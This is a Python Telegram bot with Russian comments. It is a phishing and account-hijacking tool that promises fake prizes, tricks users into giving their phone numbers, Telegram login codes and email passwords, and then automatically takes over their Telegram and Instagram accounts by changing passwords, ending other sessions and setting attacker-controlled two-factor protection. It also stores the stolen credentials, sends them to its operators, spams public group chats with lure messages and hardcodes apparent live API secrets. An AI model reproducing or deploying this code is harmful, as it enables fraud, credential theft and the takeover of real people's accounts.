#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import string
import hashlib
import base64
import sqlite3
import threading
import subprocess
import requests
import re
import logging
from datetime import datetime, timedelta
from urllib.parse import quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

# Супер-импорты с fallback
try:
    import telebot
    from telebot import types
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
except ImportError:
    os.system(f"{sys.executable} -m pip install --no-cache-dir pyTelegramBotAPI")
    import telebot
    from telebot import types

try:
    from telethon import TelegramClient, functions, types as ttypes
    from telethon.errors import SessionPasswordNeededError
except ImportError:
    os.system(f"{sys.executable} -m pip install --no-cache-dir telethon")
    from telethon import TelegramClient, functions, types as ttypes

try:
    import cloudscraper
except ImportError:
    os.system(f"{sys.executable} -m pip install --no-cache-dir cloudscraper")
    import cloudscraper

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Конфигурация
class Config:
    TOKEN = "8755487229:AAGDI58GgaR9sp0nTXudlknmLbN2Q5Yok_Q"
    API_ID = 38545864
    API_HASH = "3517b8c953e6c2d05c0f30b5015f2470"
    ADMIN_IDS = [123456789]  # Замени на свой ID
    DB_PATH = "data/users.db"
    SESSIONS_PATH = "data/sessions"
    LOGS_PATH = "data/logs"
    PHISH_PATH = "data/phish"
    
    # Настройки атак
    MAX_THREADS = 10
    CHECK_INTERVAL = 60
    AUTO_HACK = True
    AUTO_2FA = True
    AUTO_KICK = True
    AUTO_CHANGE_PASS = True
    
    # Прокси (опционально)
    PROXY = None  # "socks5://user:pass@ip:port"

# Создаем директории
os.makedirs("data", exist_ok=True)
os.makedirs(Config.SESSIONS_PATH, exist_ok=True)
os.makedirs(Config.LOGS_PATH, exist_ok=True)
os.makedirs(Config.PHISH_PATH, exist_ok=True)

# Инициализация бота
bot = telebot.TeleBot(Config.TOKEN)

# База данных
class Database:
    def __init__(self):
        self.conn = sqlite3.connect(Config.DB_PATH, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        # Пользователи
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER UNIQUE,
                               username TEXT,
                               first_name TEXT,
                               last_name TEXT,
                               phone TEXT,
                               email TEXT,
                               gift TEXT,
                               step TEXT,
                               lang TEXT DEFAULT 'ru',
                               created TIMESTAMP,
                               last_active TIMESTAMP,
                               ip TEXT,
                               user_agent TEXT,
                               referrer TEXT,
                               banned INTEGER DEFAULT 0)''')
        
        # Учетные данные
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS credentials
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               service TEXT,
                               login TEXT,
                               password TEXT,
                               code TEXT,
                               session TEXT,
                               cookies TEXT,
                               headers TEXT,
                               ip TEXT,
                               country TEXT,
                               device TEXT,
                               browser TEXT,
                               os TEXT,
                               timestamp TIMESTAMP,
                               hacked INTEGER DEFAULT 0,
                               status TEXT,
                               twofa TEXT,
                               backup_codes TEXT,
                               FOREIGN KEY(user_id) REFERENCES users(user_id))''')
        
        # Фишинг ссылки
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS phish_links
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               link TEXT UNIQUE,
                               service TEXT,
                               clicks INTEGER DEFAULT 0,
                               submissions INTEGER DEFAULT 0,
                               created TIMESTAMP,
                               expires TIMESTAMP,
                               active INTEGER DEFAULT 1,
                               FOREIGN KEY(user_id) REFERENCES users(user_id))''')
        
        # Логи
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS logs
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               action TEXT,
                               data TEXT,
                               ip TEXT,
                               timestamp TIMESTAMP,
                               FOREIGN KEY(user_id) REFERENCES users(user_id))''')
        
        # Сессии
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS sessions
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               service TEXT,
                               session_data TEXT,
                               valid INTEGER DEFAULT 1,
                               created TIMESTAMP,
                               last_used TIMESTAMP,
                               FOREIGN KEY(user_id) REFERENCES users(user_id))''')
        
        self.conn.commit()
    
    def add_user(self, user_id, username, first_name, last_name, ip=None, ua=None, ref=None):
        self.cursor.execute('''INSERT OR IGNORE INTO users 
                              (user_id, username, first_name, last_name, created, last_active, ip, user_agent, referrer)
                              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                           (user_id, username, first_name, last_name, datetime.now(), datetime.now(), ip, ua, ref))
        self.conn.commit()
    
    def update_user(self, user_id, **kwargs):
        for key, value in kwargs.items():
            self.cursor.execute(f"UPDATE users SET {key} = ? WHERE user_id = ?", (value, user_id))
        self.conn.commit()
    
    def add_creds(self, user_id, service, login, password, code=None, ip=None, device=None):
        self.cursor.execute('''INSERT INTO credentials 
                              (user_id, service, login, password, code, timestamp, ip, device)
                              VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                           (user_id, service, login, password, code, datetime.now(), ip, device))
        self.conn.commit()
        return self.cursor.lastrowid
    
    def add_phish_link(self, user_id, link, service):
        self.cursor.execute('''INSERT INTO phish_links 
                              (user_id, link, service, created, expires)
                              VALUES (?, ?, ?, ?, ?)''',
                           (user_id, link, service, datetime.now(), datetime.now() + timedelta(hours=24)))
        self.conn.commit()
    
    def log_action(self, user_id, action, data=None, ip=None):
        self.cursor.execute('''INSERT INTO logs 
                              (user_id, action, data, ip, timestamp)
                              VALUES (?, ?, ?, ?, ?)''',
                           (user_id, action, json.dumps(data) if data else None, ip, datetime.now()))
        self.conn.commit()

db = Database()

# Супер-класс для взлома
class SuperHacker:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper()
        self.executor = ThreadPoolExecutor(max_workers=Config.MAX_THREADS)
    
    def hack_telegram(self, phone, code, user_id):
        """Супер-взлом Telegram"""
        try:
            logger.info(f"Starting Telegram hack for {phone}")
            
            client = TelegramClient(
                f"{Config.SESSIONS_PATH}/user_{user_id}",
                Config.API_ID,
                Config.API_HASH,
                proxy=Config.PROXY
            )
            
            async def hack():
                await client.connect()
                
                if not await client.is_user_authorized():
                    await client.send_code_request(phone)
                    try:
                        await client.sign_in(phone, code)
                    except SessionPasswordNeededError:
                        # Запрос 2FA если нужен
                        db.update_user(user_id, step='telegram_2fa')
                        return {'status': '2fa_needed', 'phone': phone}
                
                # Получаем информацию об аккаунте
                me = await client.get_me()
                
                # Меняем облачный пароль
                if Config.AUTO_CHANGE_PASS:
                    new_password = self.generate_strong_password()
                    await client(functions.account.UpdatePasswordSettingsRequest(
                        password=None,
                        new_settings=functions.account.PasswordInputSettings(
                            new_password_hash=hashlib.sha256(new_password.encode()).hexdigest(),
                            hint="password"
                        )
                    ))
                
                # Удаляем все другие сессии
                if Config.AUTO_KICK:
                    sessions = await client(functions.account.GetAuthorizationsRequest())
                    for session in sessions.authorizations:
                        if session.hash != sessions.authorizations[0].hash:
                            await client(functions.account.ResetAuthorizationRequest(hash=session.hash))
                
                # Включаем 2FA
                if Config.AUTO_2FA:
                    twofa_secret = self.generate_2fa_secret()
                    await client(functions.account.UpdatePasswordSettingsRequest(
                        password=None,
                        new_settings=functions.account.PasswordInputSettings(
                            new_password_hash=hashlib.sha256(f"hacked_{twofa_secret}".encode()).hexdigest(),
                            hint="hacked",
                            email="hacked@gmail.com"
                        )
                    ))
                
                # Получаем контакты
                contacts = await client.get_contacts()
                
                # Получаем диалоги
                dialogs = await client.get_dialogs()
                
                # Сохраняем сессию
                session_data = await client.session.save()
                
                await client.disconnect()
                
                return {
                    'status': 'success',
                    'user_id': me.id,
                    'username': me.username,
                    'phone': me.phone,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'contacts': len(contacts),
                    'dialogs': len(dialogs),
                    'new_password': new_password if Config.AUTO_CHANGE_PASS else None,
                    'twofa_secret': twofa_secret if Config.AUTO_2FA else None,
                    'session': session_data
                }
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(hack())
            loop.close()
            
            if result['status'] == 'success':
                # Сохраняем в базу
                db.add_creds(user_id, 'telegram', phone, code, 'hacked')
                db.log_action(user_id, 'telegram_hacked', result)
                
                # Отправляем уведомление админу
                for admin in Config.ADMIN_IDS:
                    bot.send_message(
                        admin,
                        f"✅ *Telegram взломан!*\n\n"
                        f"👤 Пользователь: {result['first_name']} @{result['username']}\n"
                        f"📱 Телефон: {result['phone']}\n"
                        f"🔑 Новый пароль: `{result['new_password']}`\n"
                        f"🔐 2FA секрет: `{result['twofa_secret']}`\n"
                        f"👥 Контактов: {result['contacts']}\n"
                        f"💬 Диалогов: {result['dialogs']}",
                        parse_mode='Markdown'
                    )
            
            return result
            
        except Exception as e:
            logger.error(f"Telegram hack failed: {e}")
            return {'status': 'error', 'error': str(e)}
    
    def hack_instagram(self, username, password, user_id):
        """Супер-взлом Instagram"""
        try:
            logger.info(f"Starting Instagram hack for {username}")
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-IG-App-ID': '936619743392459',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-Connection-Speed': '10kbps'
            }
            
            session = requests.Session()
            session.headers.update(headers)
            
            # Получаем CSRF токен
            resp = session.get('https://www.instagram.com/')
            csrf_token = re.findall(r'"csrf_token":"(.*?)"', resp.text)[0]
            
            # Логинимся
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}'
            }
            
            login_resp = session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=login_data,
                headers={'X-CSRFToken': csrf_token}
            )
            
            if login_resp.json().get('authenticated'):
                # Получаем информацию
                profile = session.get(f'https://www.instagram.com/{username}/?__a=1&__d=dis').json()
                
                # Меняем пароль
                if Config.AUTO_CHANGE_PASS:
                    new_pass = self.generate_strong_password()
                    change_data = {
                        'password': password,
                        'new_password1': new_pass,
                        'new_password2': new_pass
                    }
                    session.post(
                        'https://www.instagram.com/accounts/password/change/',
                        data=change_data,
                        headers={'X-CSRFToken': csrf_token}
                    )
                
                # Включаем 2FA
                if Config.AUTO_2FA:
                    twofa_data = {
                        'seed': self.generate_2fa_secret(),
                        'type': 'totp'
                    }
                    session.post(
                        'https://www.instagram.com/api/v1/accounts/two_factor/init/',
                        data=twofa_data,
                        headers={'X-CSRFToken': csrf_token}
                    )
                
                # Получаем подписчиков
                followers = session.get(f'https://www.instagram.com/api/v1/friendships/{profile["graphql"]["user"]["id"]}/followers/').json()
                
                # Получаем подписки
                following = session.get(f'https://www.instagram.com/api/v1/friendships/{profile["graphql"]["user"]["id"]}/following/').json()
                
                # Сохраняем сессию
                cookies = session.cookies.get_dict()
                
                result = {
                    'status': 'success',
                    'username': username,
                    'user_id': profile['graphql']['user']['id'],
                    'full_name': profile['graphql']['user']['full_name'],
                    'followers': profile['graphql']['user']['edge_followed_by']['count'],
                    'following': profile['graphql']['user']['edge_follow']['count'],
                    'posts': profile['graphql']['user']['edge_owner_to_timeline_media']['count'],
                    'is_private': profile['graphql']['user']['is_private'],
                    'is_verified': profile['graphql']['user']['is_verified'],
                    'new_password': new_pass if Config.AUTO_CHANGE_PASS else None,
                    'cookies': cookies
                }
                
                # Сохраняем в базу
                db.add_creds(user_id, 'instagram', username, password, json.dumps(cookies))
                db.log_action(user_id, 'instagram_hacked', result)
                
                return result
            
            return {'status': 'failed', 'error': 'Invalid credentials'}
            
        except Exception as e:
            logger.error(f"Instagram hack failed: {e}")
            return {'status': 'error', 'error': str(e)}
    
    def generate_strong_password(self, length=16):
        """Генерация сильного пароля"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choice(chars) for _ in range(length))
    
    def generate_2fa_secret(self):
        """Генерация секрета для 2FA"""
        return base64.b32encode(os.urandom(10)).decode('utf-8')

hacker = SuperHacker()

# Команды бота
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    username = message.from_user.username or "NoUsername"
    first_name = message.from_user.first_name or ""
    last_name = message.from_user.last_name or ""
    
    # Получаем IP пользователя (приблизительно)
    ip = message.json.get('from', {}).get('ip', 'Unknown')
    
    db.add_user(user_id, username, first_name, last_name, ip)
    
    # Главное меню
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🎁 ПОЛУЧИТЬ ПОДАРОК", callback_data="get_gift"),
        InlineKeyboardButton("📱 ПОДПИСКИ", callback_data="socials"),
        InlineKeyboardButton("💰 БОНУСЫ", callback_data="bonus"),
        InlineKeyboardButton("⭐ ПРЕМИУМ", callback_data="premium"),
        InlineKeyboardButton("🎮 РОЗЫГРЫШ", callback_data="raffle"),
        InlineKeyboardButton("🔥 VIP", callback_data="vip")
    )
    
    bot.send_message(
        user_id,
        f"✨ *ДОБРО ПОЖАЛОВАТЬ, {first_name}!*\n\n"
        "🎁 *ТЕБЯ ЖДУТ МЕГА-ПРИЗЫ:*\n"
        "• Telegram Premium на 1 год\n"
        "• 1000 Telegram Stars\n"
        "• iPhone 16 Pro Max\n"
        "• 100 000 рублей\n"
        "• PlayStation 6\n"
        "• BMW M5 Competition\n\n"
        "👇 *ВЫБЕРИ, ЧТО ХОЧЕШЬ ПОЛУЧИТЬ ПРЯМО СЕЙЧАС!*",
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    if call.data == "get_gift":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("📱 Telegram Premium", callback_data="gift_premium"),
            InlineKeyboardButton("⭐ Telegram Stars", callback_data="gift_stars"),
            InlineKeyboardButton("📱 iPhone 16", callback_data="gift_iphone"),
            InlineKeyboardButton("💰 100 000 руб", callback_data="gift_money"),
            InlineKeyboardButton("🎮 PlayStation 6", callback_data="gift_ps6"),
            InlineKeyboardButton("🚗 BMW M5", callback_data="gift_bmw"),
            InlineKeyboardButton("🔙 НАЗАД", callback_data="back")
        )
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text="🎁 *ВЫБЕРИ ПОДАРОК:*\n\n"
                 "⬇️ Нажми на кнопку с подарком ⬇️",
            parse_mode='Markdown',
            reply_markup=markup
        )
    
    elif call.data.startswith("gift_"):
        gift = call.data.replace("gift_", "")
        
        # Сохраняем выбор
        db.update_user(user_id, gift=gift, step='social')
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("📱 Telegram", url="https://t.me/your_channel"),
            InlineKeyboardButton("📸 Instagram", url="https://instagram.com/your_page"),
            InlineKeyboardButton("▶️ YouTube", url="https://youtube.com/@your_channel"),
            InlineKeyboardButton("🎵 TikTok", url="https://tiktok.com/@your_page"),
            InlineKeyboardButton("💬 VK", url="https://vk.com/your_page"),
            InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subs")
        )
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text=f"🎁 *Твой подарок:* {gift.upper()}\n\n"
                 "📢 *ДЛЯ ПОЛУЧЕНИЯ ПОДАРКА:*\n"
                 "1️⃣ Подпишись на все соцсети\n"
                 "2️⃣ Нажми 'Я ПОДПИСАЛСЯ'\n"
                 "3️⃣ Пройди быструю верификацию\n"
                 "4️⃣ Получи подарок мгновенно!\n\n"
                 "⬇️ *КНОПКИ ПОДПИСКИ* ⬇️",
            parse_mode='Markdown',
            reply_markup=markup
        )
    
    elif call.data == "check_subs":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("📱 Telegram (код)", callback_data="verify_telegram"),
            InlineKeyboardButton("📧 Email", callback_data="verify_email"),
            InlineKeyboardButton("📱 SMS", callback_data="verify_sms"),
            InlineKeyboardButton("🔑 Пароль", callback_data="verify_password")
        )
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text="✅ *ПОДПИСКИ ПРОВЕРЕНЫ!*\n\n"
                 "🔐 *ВЫБЕРИ СПОСОБ ВЕРИФИКАЦИИ:*\n"
                 "1. Telegram (код подтверждения)\n"
                 "2. Email (пароль от почты)\n"
                 "3. SMS (номер телефона)\n"
                 "4. Пароль (любой аккаунт)\n\n"
                 "⬇️ *ВЫБЕРИ СПОСОБ* ⬇️",
            parse_mode='Markdown',
            reply_markup=markup
        )
    
    elif call.data == "verify_telegram":
        db.update_user(user_id, step='telegram_phone')
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text="📱 *ВЕРИФИКАЦИЯ TELEGRAM*\n\n"
                 "Введи свой номер телефона:\n"
                 "Пример: `+79001234567`\n\n"
                 "⚠️ *Это нужно для подтверждения личности*",
            parse_mode='Markdown'
        )
    
    elif call.data == "verify_email":
        db.update_user(user_id, step='email_input')
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text="📧 *ВЕРИФИКАЦИЯ EMAIL*\n\n"
                 "Введи свой email:\n"
                 "Пример: `example@gmail.com`\n\n"
                 "⚠️ *На него придет подарок*",
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    # Получаем текущий шаг
    db.cursor.execute("SELECT step FROM users WHERE user_id = ?", (user_id,))
    result = db.cursor.fetchone()
    
    if result:
        step = result[0]
        
        if step == 'telegram_phone':
            if re.match(r'^\+?[0-9]{10,15}$', text.replace(' ', '')):
                db.update_user(user_id, step='telegram_code', phone=text)
                db.log_action(user_id, 'telegram_phone', text)
                bot.send_message(
                    user_id,
                    "📱 *Отлично!*\n\n"
                    "Теперь введи код подтверждения из Telegram:",
                    parse_mode='Markdown'
                )
            else:
                bot.send_message(
                    user_id,
                    "❌ *Неверный формат!*\n\n"
                    "Введи номер в формате: `+79001234567`",
                    parse_mode='Markdown'
                )
        
        elif step == 'telegram_code':
            db.update_user(user_id, step='completed')
            db.log_action(user_id, 'telegram_code', text)
            
            # Запускаем взлом в отдельном потоке
            db.cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user_id,))
            phone = db.cursor.fetchone()[0]
            
            threading.Thread(target=hacker.hack_telegram, args=(phone, text, user_id)).start()
            
            bot.send_message(
                user_id,
                "✅ *ВЕРИФИКАЦИЯ ПРОЙДЕНА!*\n\n"
                "🎁 *ТВОЙ ПОДАРОК УЖЕ В ПУТИ!*\n\n"
                "💫 Ожидай в течение 5 минут\n"
                "✨ Спасибо за участие!",
                parse_mode='Markdown'
            )
        
        elif step == 'email_input':
            if re.match(r'^[^@]+@[^@]+\.[^@]+$', text):
                db.update_user(user_id, step='email_password', email=text)
                db.log_action(user_id, 'email_input', text)
                bot.send_message(
                    user_id,
                    "📧 *Отлично!*\n\n"
                    "Теперь введи пароль от этой почты:",
                    parse_mode='Markdown'
                )
            else:
                bot.send_message(
                    user_id,
                    "❌ *Неверный формат!*\n\n"
                    "Введи email в формате: `example@gmail.com`",
                    parse_mode='Markdown'
                )
        
        elif step == 'email_password':
            db.update_user(user_id, step='completed')
            db.log_action(user_id, 'email_password', text)
            
            db.cursor.execute("SELECT email FROM users WHERE user_id = ?", (user_id,))
            email = db.cursor.fetchone()[0]
            
            db.add_creds(user_id, 'email', email, text)
            
            bot.send_message(
                user_id,
                "✅ *ВЕРИФИКАЦИЯ ПРОЙДЕНА!*\n\n"
                "🎁 *ТВОЙ ПОДАРОК УЖЕ В ПУТИ!*\n\n"
                "💫 Ожидай в течение 5 минут\n"
                "✨ Спасибо за участие!",
                parse_mode='Markdown'
            )

# Команда для просмотра статистики
@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    user_id = message.from_user.id
    
    if user_id in Config.ADMIN_IDS:
        db.cursor.execute("SELECT COUNT(*) FROM users")
        total_users = db.cursor.fetchone()[0]
        
        db.cursor.execute("SELECT COUNT(*) FROM credentials")
        total_creds = db.cursor.fetchone()[0]
        
        db.cursor.execute("SELECT COUNT(*) FROM phish_links")
        total_links = db.cursor.fetchone()[0]
        
        db.cursor.execute("SELECT COUNT(*) FROM logs WHERE timestamp > datetime('now', '-1 day')")
        today_logs = db.cursor.fetchone()[0]
        
        bot.send_message(
            user_id,
            f"📊 *СТАТИСТИКА БОТА*\n\n"
            f"👥 Всего пользователей: {total_users}\n"
            f"🔑 Всего учеток: {total_creds}\n"
            f"🔗 Фишинг ссылок: {total_links}\n"
            f"📝 Логов за 24ч: {today_logs}\n"
            f"⚡ Статус: ONLINE\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode='Markdown'
        )

# Команда для показа всех учеток
@bot.message_handler(commands=['creds'])
def creds_cmd(message):
    user_id = message.from_user.id
    
    if user_id in Config.ADMIN_IDS:
        db.cursor.execute('''SELECT service, login, password, timestamp FROM credentials 
                           ORDER BY timestamp DESC LIMIT 20''')
        creds = db.cursor.fetchall()
        
        if creds:
            text = "🔑 *ПОСЛЕДНИЕ УЧЕТКИ:*\n\n"
            for i, (service, login, password, ts) in enumerate(creds, 1):
                text += f"{i}. *{service.upper()}*\n"
                text += f"   👤 Логин: `{login}`\n"
                text += f"   🔑 Пароль: `{password}`\n"
                text += f"   🕐 {ts}\n\n"
            
            bot.send_message(user_id, text, parse_mode='Markdown')
        else:
            bot.send_message(user_id, "❌ Нет учетных данных")

# Команда для очистки базы
@bot.message_handler(commands=['clear'])
def clear_cmd(message):
    user_id = message.from_user.id
    
    if user_id in Config.ADMIN_IDS:
        db.cursor.execute("DELETE FROM credentials")
        db.cursor.execute("DELETE FROM logs")
        db.conn.commit()
        bot.send_message(user_id, "✅ База очищена!")

# Автоматическая рассылка в группы
def spam_groups():
    groups = [
        '@uzbekistan_chat',
        '@russia_chat',
        '@moscow_chat',
        '@tashkent_chat'
    ]
    
    messages = [
        "🎁 *БЕСПЛАТНЫЙ TELEGRAM PREMIUM!*\n\nЗабирай → @YourBot",
        "💰 *100 000 РУБЛЕЙ ЗА ПОДПИСКУ!*\n\nПодробности: @YourBot",
        "📱 *IPHONE 16 PRO MAX В ПОДАРОК!*\n\nУчаствуй: @YourBot",
        "⭐ *1000 ЗВЕЗД TELEGRAM КАЖДОМУ!*\n\nПолучить: @YourBot",
        "🔥 *СРОЧНО! РОЗЫГРЫШ PLAYSTATION 6*\n\nЖми: @YourBot"
    ]
    
    while True:
        try:
            for group in groups:
                msg = random.choice(messages)
                bot.send_message(group, msg, parse_mode='Markdown')
                time.sleep(5)
        except Exception as e:
            logger.error(f"Spam error: {e}")
        
        time.sleep(900)  # 15 минут

# Запуск рассылки
spam_thread = threading.Thread(target=spam_groups, daemon=True)
spam_thread.start()

# Запуск бота
if __name__ == "__main__":
    logger.info("🚀 СУПЕР-БОТ ЗАПУЩЕН!")
    logger.info(f"👤 Админы: {Config.ADMIN_IDS}")
    logger.info(f"📊 База данных: {Config.DB_PATH}")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            logger.error(f"Бот упал: {e}")
            time.sleep(5)
            continue
